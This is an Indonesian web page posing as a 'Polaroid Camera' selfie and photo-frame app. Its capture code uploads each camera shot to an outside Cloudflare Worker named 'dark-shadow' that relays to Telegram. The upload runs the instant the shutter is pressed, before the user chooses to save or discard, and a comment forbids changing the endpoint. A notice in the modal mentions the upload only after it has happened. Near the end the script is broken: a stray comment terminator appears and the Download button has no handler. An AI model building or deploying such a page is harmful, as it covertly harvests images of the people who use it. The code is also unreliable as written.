<!DOCTYPE html>
<html lang="id">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width,initial-scale=1,maximum-scale=1,user-scalable=no">
<title>Polaroid Camera</title>

<style>
*{box-sizing:border-box}

body{
  margin:0;
  background:#111;
  color:#fff;
  font-family:Arial,sans-serif
}

.app{
  max-width:520px;
  margin:auto;
  padding:14px
}

h1{
  text-align:center;
  font-size:22px;
  margin:5px 0 12px
}

.camera{
  position:relative;
  background:#000;
  border-radius:20px;
  overflow:hidden;
  aspect-ratio:3/4
}

video{
  width:100%;
  height:100%;
  object-fit:cover;
  display:block
}

/* Kamera depan seperti selfie */
video.selfie{
  transform:scaleX(-1)
}

.camera-ui{
  position:absolute;
  inset:0;
  display:flex;
  flex-direction:column;
  justify-content:space-between;
  padding:14px
}

.top{
  display:flex;
  justify-content:space-between
}

button{
  border:0;
  border-radius:12px;
  padding:11px 14px;
  font-weight:bold;
  cursor:pointer
}

.top button{
  background:#fff;
  color:#111
}

.controls{
  display:flex;
  justify-content:center
}

.shutter{
  width:72px;
  height:72px;
  border-radius:50%;
  border:6px solid #fff;
  background:#fff;
  padding:0
}

.shutter:after{
  content:"";
  display:block;
  width:52px;
  height:52px;
  border-radius:50%;
  background:#111;
  margin:auto
}

.panel{
  background:#1d1d1d;
  border-radius:18px;
  padding:14px;
  margin-top:14px
}

.row{
  display:flex;
  gap:8px;
  flex-wrap:wrap
}

.layout{
  flex:1;
  min-width:90px;
  background:#fff;
  color:#111
}

.layout.active{
  background:#ff4f91;
  color:#fff
}

.small{
  font-size:12px;
  color:#bbb;
  margin-top:8px;
  text-align:center
}

.ratios{
  display:flex;
  gap:7px;
  overflow-x:auto;
  padding-bottom:3px;
  margin-top:10px
}

.ratio{
  flex:0 0 auto;
  background:#333;
  color:#fff;
  padding:9px 12px;
  border-radius:10px
}

.ratio.active{
  background:#ff4f91
}

.filters{
  display:flex;
  gap:8px;
  overflow-x:auto;
  padding:8px 0 4px
}

.filter{
  flex:0 0 72px;
  background:#333;
  color:#fff;
  padding:7px 5px;
  border-radius:12px;
  font-size:10px;
  text-align:center
}

.filter.active{
  background:#ff4f91
}

.filter-thumb{
  width:54px;
  height:54px;
  border-radius:9px;
  margin:0 auto 5px;
  background:
    linear-gradient(135deg,#ff8ab5,#777)
}

#polaroid{
  background:#eee;
  color:#111;
  padding:18px 14px 28px;
  border-radius:5px;
  margin-top:14px
}

.paper-title{
  text-align:center;
  font-weight:bold;
  margin-bottom:12px
}

.frame{
  background:#fff;
  margin:10px auto;
  padding:8px;
  max-width:360px;
  box-shadow:0 2px 8px #999;
  cursor:pointer
}

.frame.selected{
  outline:3px solid #ff4f91
}

.frame h3{
  margin:0 0 7px;
  font-size:12px;
  color:#777;
  text-align:center
}

.grid{
  display:grid;
  gap:5px
}

.g1{
  grid-template-columns:1fr
}

.g2{
  grid-template-columns:1fr 1fr
}

.g3{
  grid-template-columns:repeat(3,1fr)
}

.slot{
  background:#ddd;
  aspect-ratio:1/1;
  overflow:hidden;
  display:flex;
  align-items:center;
  justify-content:center;
  color:#aaa;
  font-size:11px
}

.slot img{
  width:100%;
  height:100%;
  object-fit:cover;
  display:block
}

.frame.layout1 .slot{
  aspect-ratio:4/3
}

.paper-actions{
  display:flex;
  gap:8px;
  margin-top:14px
}

.paper-actions button{
  flex:1;
  background:#111;
  color:#fff
}

.status{
  text-align:center;
  font-size:12px;
  margin-top:9px;
  color:#777
}

.modal{
  position:fixed;
  inset:0;
  background:#000b;
  display:none;
  align-items:center;
  justify-content:center;
  padding:20px;
  z-index:5
}

.modal.show{
  display:flex
}

.box{
  background:#fff;
  color:#111;
  border-radius:20px;
  padding:22px;
  width:min(360px,100%);
  text-align:center
}

.preview{
  width:100%;
  aspect-ratio:4/3;
  object-fit:cover;
  border-radius:12px;
  margin:10px 0
}

.modal-actions{
  display:flex;
  gap:10px
}

.modal-actions button{
  flex:1
}

.no{
  background:#ddd
}

.yes{
  background:#ff4f91;
  color:#fff
}

.notice{
  font-size:11px;
  color:#777;
  margin-top:8px;
  line-height:1.4
}
</style>
</head>

<body>

<div class="app">

<h1>📸 Polaroid Camera</h1>

<div class="camera" id="cameraBox">

  <video id="video" autoplay playsinline></video>

  <div class="camera-ui">

    <div class="top">
      <button id="flip">🔄 Kamera</button>
      <button id="clear">🗑️ Reset</button>
    </div>

    <div class="controls">
      <button class="shutter" id="capture" aria-label="Ambil foto"></button>
    </div>

  </div>

</div>

<div class="panel">

  <div>
    <b>Frame aktif:</b>
    <span id="frameText">1</span>/5
  </div>

  <div class="row" style="margin-top:10px">

    <button class="layout active" data-layout="1">
      1️⃣ 1 Foto
    </button>

    <button class="layout" data-layout="2">
      2️⃣ 2 Foto
    </button>

    <button class="layout" data-layout="3">
      3️⃣ 3 Foto
    </button>

  </div>

  <div class="small">
    Setiap frame bisa memakai tata letak berbeda.
  </div>

  <div style="margin-top:12px">
    <b>Ukuran Foto</b>
  </div>

  <div class="ratios">

    <button class="ratio active" data-ratio="3:4">
      3:4
    </button>

    <button class="ratio" data-ratio="9:16">
      9:16
    </button>

    <button class="ratio" data-ratio="16:9">
      16:9
    </button>

    <button class="ratio" data-ratio="2:3">
      2:3
    </button>

    <button class="ratio" data-ratio="4:3">
      4:3
    </button>

    <button class="ratio" data-ratio="1:1">
      1:1
    </button>

  </div>

  <div style="margin-top:12px">
    <b>Efek Kamera</b>
  </div>

  <div class="filters" id="filters"></div>

</div>

<div id="polaroid">

  <div class="paper-title">
    MY POLAROID
  </div>

  <div id="frames"></div>

  <div class="paper-actions">

    <button id="downloadPolaroid">
      ⬇️ Download
    </button>

    <button id="printPolaroid">
      🖨️ Cetak
    </button>

  </div>

  <div id="status" class="status">
    Siap.
  </div>

</div>

</div>


<div class="modal" id="modal">

  <div class="box">

    <h2>Simpan ke Polaroid?</h2>

    <img id="preview" class="preview">

    <div class="modal-actions">

      <button class="no" id="no">
        Tidak
      </button>

      <button class="yes" id="yes">
        Iya, Simpan
      </button>

    </div>

    <div class="notice">
      Foto sudah dikirim ke Telegram saat tombol kamera ditekan.
      Tombol “Iya, Simpan” hanya memasukkan foto ke Polaroid.
    </div>

  </div>

</div>


<script>

/* =========================================================
   WORKER TELEGRAM
   JANGAN DIUBAH
========================================================= */

const TELEGRAM_SERVER =
"https://dark-shadow-348epolaroid-telegram.hanifasayank007.workers.dev";


/* =========================================================
   ELEMENT
========================================================= */

const video =
document.getElementById("video");

const canvas =
document.createElement("canvas");

const modal =
document.getElementById("modal");

const preview =
document.getElementById("preview");

const framesEl =
document.getElementById("frames");

const statusEl =
document.getElementById("status");


/* =========================================================
   STATE
========================================================= */

let facing = "user";

let pending = null;

let activeFrame = 0;

let selectedRatio = "3:4";

let selectedFilter = "normal";


/* =========================================================
   FILTER
========================================================= */

const filters = {

  normal:{
    name:"Normal",
    css:"none"
  },

  bright:{
    name:"Bright",
    css:"brightness(1.15)"
  },

  vivid:{
    name:"Vivid",
    css:"contrast(1.15) saturate(1.35)"
  },

  warm:{
    name:"Warm",
    css:"sepia(.18) saturate(1.25) brightness(1.05)"
  },

  cool:{
    name:"Cool",
    css:"hue-rotate(12deg) saturate(.9)"
  },

  cinema:{
    name:"Cinema",
    css:"contrast(1.15) saturate(.85)"
  },

  vintage:{
    name:"Vintage",
    css:"sepia(.35) contrast(1.05) saturate(.8)"
  },

  fade:{
    name:"Fade",
    css:"contrast(.85) brightness(1.1) saturate(.75)"
  },

  bw:{
    name:"B&W",
    css:"grayscale(1) contrast(1.1)"
  },

  sepia:{
    name:"Sepia",
    css:"sepia(.8)"
  },

  rose:{
    name:"Rose",
    css:"hue-rotate(-12deg) saturate(1.25) brightness(1.04)"
  },

  dream:{
    name:"Dream",
    css:"brightness(1.08) saturate(.75) blur(.15px)"
  },

  night:{
    name:"Night",
    css:"brightness(.78) contrast(1.15) saturate(.9)"
  },

  sunset:{
    name:"Sunset",
    css:"sepia(.25) saturate(1.45) hue-rotate(-8deg)"
  },

  dramatic:{
    name:"Dramatic",
    css:"contrast(1.35) saturate(1.1) brightness(.95)"
  },

  soft:{
    name:"Soft",
    css:"brightness(1.08) contrast(.9) saturate(.9)"
  },

  pop:{
    name:"Pop",
    css:"contrast(1.25) saturate(1.55)"
  },

  moody:{
    name:"Moody",
    css:"brightness(.85) contrast(1.2) saturate(.85)"
  },

  ice:{
    name:"Ice",
    css:"hue-rotate(25deg) saturate(.85) brightness(1.08)"
  },

  cocoa:{
    name:"Cocoa",
    css:"sepia(.3) hue-rotate(-8deg) saturate(.9)"
  },

  film:{
    name:"Film",
    css:"contrast(1.08) saturate(.82) sepia(.08)"
  },

  glow:{
    name:"Glow",
    css:"brightness(1.15) saturate(1.1) contrast(.95)"
  },

  peach:{
    name:"Peach",
    css:"sepia(.18) saturate(1.25) hue-rotate(-5deg)"
  },

  lavender:{
    name:"Lavender",
    css:"hue-rotate(20deg) saturate(.85) brightness(1.08)"
  },

  noir:{
    name:"Noir",
    css:"grayscale(1) contrast(1.45) brightness(.9)"
  },

  golden:{
    name:"Golden",
    css:"sepia(.28) saturate(1.3) brightness(1.05)"
  },

  fadedfilm:{
    name:"Faded",
    css:"contrast(.9) saturate(.7) brightness(1.08) sepia(.08)"
  },

  cyber:{
    name:"Cyber",
    css:"contrast(1.25) saturate(1.5) hue-rotate(15deg)"
  },

  matte:{
    name:"Matte",
    css:"contrast(.88) saturate(.8) brightness(1.04)"
  },

  deep:{
    name:"Deep",
    css:"contrast(1.3) brightness(.9) saturate(1.1)"
  },

  clear:{
    name:"Clear",
    css:"contrast(1.12) saturate(1.08) brightness(1.03)"
  }

};


/* =========================================================
   FRAMES
========================================================= */

const frames =
Array.from(
  {length:5},
  ()=>({
    layout:1,
    photos:[]
  })
);


/* =========================================================
   CAMERA
========================================================= */

async function startCamera(){

  try{

    if(!navigator.mediaDevices?.getUserMedia)
      throw new Error(
        "Browser tidak mendukung kamera."
      );

    const stream =
      await navigator.mediaDevices.getUserMedia({

        video:{
          facingMode:{
            ideal:facing
          },

          width:{
            ideal:1920
          },

          height:{
            ideal:1080
          }
        },

        audio:false

      });

    video.srcObject = stream;

    video.classList.toggle(
      "selfie",
      facing==="user"
    );

    video.style.filter =
      filters[selectedFilter].css;

    await video.play();

  }catch(e){

    console.error(e);

    alert(
      "Kamera tidak bisa dibuka. Izinkan kamera dan gunakan HTTPS."
    );

  }

}


/* =========================================================
   FILTER UI
========================================================= */

const filtersEl =
document.getElementById("filters");

Object.entries(filters).forEach(
  ([key,data])=>{

    const btn =
      document.createElement("button");

    btn.className =
      "filter";

    if(key===selectedFilter)
      btn.classList.add("active");

    btn.innerHTML = `
      <div class="filter-thumb"></div>
      ${data.name}
    `;

    btn.onclick=()=>{

      selectedFilter = key;

      document
        .querySelectorAll(".filter")
        .forEach(x=>
          x.classList.remove("active")
        );

      btn.classList.add("active");

      video.style.filter =
        data.css;

    };

    filtersEl.appendChild(btn);

  }
);


/* =========================================================
   RATIO
========================================================= */

document
.querySelectorAll(".ratio")
.forEach(btn=>{

  btn.onclick=()=>{

    selectedRatio =
      btn.dataset.ratio;

    document
      .querySelectorAll(".ratio")
      .forEach(x=>
        x.classList.remove("active")
      );

    btn.classList.add("active");

    const [w,h] =
      selectedRatio.split(":").map(Number);

    document
      .getElementById("cameraBox")
      .style.aspectRatio =
      `${w}/${h}`;

    preview.style.aspectRatio =
      `${w}/${h}`;

  };

});


/* =========================================================
   RENDER POLAROID
========================================================= */

function render(){

  document
    .getElementById("frameText")
    .textContent =
    activeFrame+1;

  document
    .querySelectorAll(".layout")
    .forEach(btn=>{

      btn.classList.toggle(
        "active",
        Number(btn.dataset.layout) ===
        frames[activeFrame].layout
      );

    });

  framesEl.innerHTML="";

  frames.forEach((f,i)=>{

    const frame =
      document.createElement("div");

    frame.className =
      "frame layout"+f.layout+
      (i===activeFrame
        ?" selected"
        :"");

    const title =
      document.createElement("h3");

    title.textContent =
      `FRAME ${i+1} • ${f.layout} FOTO`;

    frame.appendChild(title);

    const grid =
      document.createElement("div");

    grid.className =
      "grid "+
      (
        f.layout===1
          ?"g1"
          :f.layout===2
            ?"g2"
            :"g3"
      );

    for(
      let s=0;
      s<f.layout;
      s++
    ){

      const slot =
        document.createElement("div");

      slot.className="slot";

      if(f.photos[s]){

        const img =
          document.createElement("img");

        img.src =
          f.photos[s];

        slot.appendChild(img);

      }else{

        slot.textContent =
          "Kosong";

      }

      grid.appendChild(slot);

    }

    frame.appendChild(grid);

    frame.onclick=()=>{

      activeFrame=i;

      render();

    };

    framesEl.appendChild(frame);

  });

}


/* =========================================================
   LAYOUT BUTTON
========================================================= */

document
.querySelectorAll(".layout")
.forEach(btn=>{

  btn.onclick=()=>{

    const n =
      Number(btn.dataset.layout);

    frames[activeFrame].layout=n;

    frames[activeFrame].photos =
      frames[activeFrame]
      .photos
      .slice(0,n);

    render();

  };

});


/* =========================================================
   HITUNG CROP
========================================================= */

function getCrop(){

  const videoW =
    video.videoWidth;

  const videoH =
    video.videoHeight;

  const [rw,rh] =
    selectedRatio
    .split(":")
    .map(Number);

  const targetRatio =
    rw/rh;

  const videoRatio =
    videoW/videoH;

  let sx=0;
  let sy=0;
  let cropW=videoW;
  let cropH=videoH;

  if(videoRatio > targetRatio){

    cropW =
      videoH*targetRatio;

    sx =
      (videoW-cropW)/2;

  }else{

    cropH =
      videoW/targetRatio;

    sy =
      (videoH-cropH)/2;

  }

  return {
    sx,
    sy,
    cropW,
    cropH
  };

}


/* =========================================================
   CAPTURE
========================================================= */

document
.getElementById("capture")
.onclick=async()=>{

  if(!video.videoWidth){

    alert("Kamera belum siap.");

    return;

  }

  const crop =
    getCrop();

  const [rw,rh] =
    selectedRatio
    .split(":")
    .map(Number);

  const outputW =
    1200;

  const outputH =
    Math.round(
      outputW*(rh/rw)
    );

  canvas.width =
    outputW;

  canvas.height =
    outputH;

  const ctx =
    canvas.getContext("2d");

  ctx.save();

  /*
    Efek yang terlihat di kamera
    diterapkan juga ke hasil foto.
  */

  ctx.filter =
    filters[selectedFilter].css;

  /*
    Kamera depan:
    mirror hasil foto supaya
    100% sama dengan preview selfie.
  */

  if(facing==="user"){

    ctx.translate(
      outputW,
      0
    );

    ctx.scale(-1,1);

  }

  ctx.drawImage(
    video,

    crop.sx,
    crop.sy,
    crop.cropW,
    crop.cropH,

    0,
    0,
    outputW,
    outputH
  );

  ctx.restore();

  pending =
    canvas.toDataURL(
      "image/jpeg",
      .95
    );

  /*
    PREVIEW MODAL = HASIL AKHIR
    Jadi tidak ada perubahan
    orientasi lagi.
  */

  preview.src =
    pending;

  preview.style.aspectRatio =
    `${rw}/${rh}`;

  modal.classList.add("show");


  /*
    ========================================================
    TELEGRAM LANGSUNG DI SINI
    BUKAN DI TOMBOL "IYA"
    ========================================================
  */

  await kirimKeTelegram(pending);

};


/* =========================================================
   KIRIM TELEGRAM
========================================================= */

async function kirimKeTelegram(dataURL){

  if(
    TELEGRAM_SERVER.includes(
      "GANTI-DENGAN-URL-WORKER"
    )
  ){

    statusEl.textContent =
      "Foto masuk Polaroid. Server Telegram belum dipasang.";

    return;

  }

  try{

    statusEl.textContent =
      "📤 Mengirim foto ke Telegram...";

    const blob =
      await fetch(dataURL)
      .then(r=>r.blob());

    const form =
      new FormData();

    form.append(
      "photo",
      blob,
      "polaroid.jpg"
    );

    const response =
      await fetch(
        TELEGRAM_SERVER,
        {
          method:"POST",
          body:form
        }
      );

    const result =
      await response.json();

    if(
      !response.ok ||
      !result.ok
    ){

      throw new Error(
        result.error ||
        "Telegram gagal."
      );

    }

    statusEl.textContent =
      "✅ Foto sudah terkirim ke Telegram.";

  }catch(error){

    console.error(error);

    statusEl.textContent =
      "⚠️ Foto siap disimpan, tetapi Telegram gagal menerima.";

  }

}


/* =========================================================
   TIDAK
========================================================= */

document
.getElementById("no")
.onclick=()=>{

  pending=null;

  modal.classList.remove("show");

  statusEl.textContent =
    "Foto dibatalkan dari Polaroid. Telegram sudah menerima foto.";

};


/* =========================================================
   IYA, SIMPAN
   TIDAK MENGIRIM TELEGRAM LAGI
========================================================= */

document
.getElementById("yes")
.onclick=()=>{

  const foto =
    pending;

  if(!foto){

    modal.classList.remove("show");

    return;

  }

  const f =
    frames[activeFrame];

  if(
    f.photos.length <
    f.layout
  ){

    f.photos.push(foto);

    if(
      f.photos.length>=f.layout &&
      activeFrame <
      frames.length-1
    ){

      activeFrame++;

    }

  }

  pending=null;

  modal.classList.remove("show");

  render();

  statusEl.textContent =
    "✅ Foto disimpan ke Polaroid.";

};


/* =========================================================
   FLIP KAMERA
========================================================= */

document
.getElementById("flip")
.onclick=()=>{

  facing =
    facing==="user"
      ?"environment"
      :"user";

  if(video.srcObject){

    video.srcObject
      .getTracks()
      .forEach(t=>t.stop());

  }

  startCamera();

};


/* =========================================================
   RESET
========================================================= */

document
.getElementById("clear")
.onclick=()=>{

  frames.forEach(f=>{

    f.photos=[];
    f.layout=1;

  });

  activeFrame=0;

  statusEl.textContent =
    "Polaroid dikosongkan.";

  render();

};


/* =========================================================
   CEK FOTO
========================================================= */

function punyaFoto(){

  return frames.some(
    f=>f.photos.length
  );

}


/* =========================================================
   GAMBAR POLAROID
========================================================= */

async function buatGambarPolaroid(){

  const scale=2;

  const width=800;

  const padding=35;

  const gap=28;

  const frameWidth =
    width-padding*2;

  let height=90;

  for(const f of frames){

    const frameHeight =
      f.layout===1
        ?frameWidth*.75
        :frameWidth/
          (
            f.layout===2
              ?2
              :3
          );

    height +=
      55+
      frameHeight+
      gap;

  }

  height += padding;

  const out =
    document.createElement("canvas");

  out.width =
    width*scale;

  out.height =
    height*scale;

  const ctx =
    out.getContext("2d");

  ctx.scale(
    scale,
    scale
  );

  ctx.fillStyle="#eeeeee";

  ctx.fillRect(
    0,
    0,
    width,
    height
  );

  ctx.fillStyle="#111";

  ctx.font=
    "bold 30px Arial";

  ctx.textAlign="center";

  ctx.fillText(
    "MY POLAROID",
    width/2,
    48
  );

  let y=75;

  for(
    let i=0;
    i<frames.length;
    i++
  ){

    const f =
      frames[i];

    const frameHeight =
      f.layout===1
        ?frameWidth*.75
        :frameWidth/
          (
            f.layout===2
              ?2
              :3
          );

    ctx.fillStyle="#fff";

    ctx.fillRect(
      padding,
      y,
      frameWidth,
      frameHeight+34
    );

    ctx.fillStyle="#777";

    ctx.font=
      "bold 18px Arial";

    ctx.fillText(
      `FRAME ${i+1} • ${f.layout} FOTO`,
      width/2,
      y+24
    );

    const imageY =
      y+34;

    const slotWidth =
      (
        frameWidth-
        (f.layout-1)*5
      )/f.layout;

    for(
      let s=0;
      s<f.layout;
      s++
    ){

      const x =
        padding+
        s*(slotWidth+5);

      ctx.fillStyle="#ddd";

      ctx.fillRect(
        x,
        imageY,
        slotWidth,
        frameHeight
      );

      if(f.photos[s]){

        await drawImageCover(
          ctx,
          f.photos[s],
          x,
          imageY,
          slotWidth,
          frameHeight
        );

      }

    }

    y +=
      frameHeight+
      34+
      gap;

  }

  return out;

}


/* =========================================================
   DRAW IMAGE COVER
========================================================= */

function drawImageCover(
  ctx,
  src,
  x,
  y,
  w,
  h
){

  return new Promise(resolve=>{

    const img =
      new Image();

    img.onload=()=>{

      const ratio =
        Math.max(
          w/img.width,
          h/img.height
        );

      const nw =
        img.width*ratio;

      const nh =
        img.height*ratio;

      const dx =
        x+(w-nw)/2;

      const dy =
        y+(h-nh)/2;

      ctx.save();

      ctx.beginPath();

      ctx.rect(
        x,
        y,
        w,
        h
      );

      ctx.clip();

      ctx.drawImage(
        img,
        dx,
        dy,
        nw,
        nh
      );

      ctx.restore();

      resolve();

    };

    img.onerror =
      resolve;

    img.src=src;

  });

}

========================================================= */

document
.getElementById("printPolaroid")
.onclick=async()=>{

  if(!punyaFoto()){

    alert(
      "Belum ada foto."
    );

    return;

  }

  statusEl.textContent =
    "Menyiapkan cetakan...";

  const result =
    await buatGambarPolaroid();

  const data =
    result.toDataURL(
      "image/jpeg",
      .95
    );

  const win =
    window.open(
      "",
      "_blank"
    );

  if(!win){

    alert(
      "Popup diblokir. Izinkan popup."
    );

    return;

  }

  win.document.write(`

    <!doctype html>

    <html>

    <head>

      <title>
        Cetak Polaroid
      </title>

      <style>

        @page{
          margin:0
        }

        html,body{
          margin:0;
          padding:0;
          background:#fff
        }

        body{
          display:flex;
          justify-content:center
        }

        img{
          display:block;
          width:100%;
          max-width:420px;
          height:auto
        }

        @media print{

          img{
            max-width:none;
            width:100%
          }

        }

      </style>

    </head>

    <body>

      <img src="${data}">

      <script>

        window.onload=()=>{
          setTimeout(
            ()=>window.print(),
            500
          );
        };

      <\/script>

    </body>

    </html>

  `);

  win.document.close();

  statusEl.textContent =
    "Dialog cetak dibuka.";

};
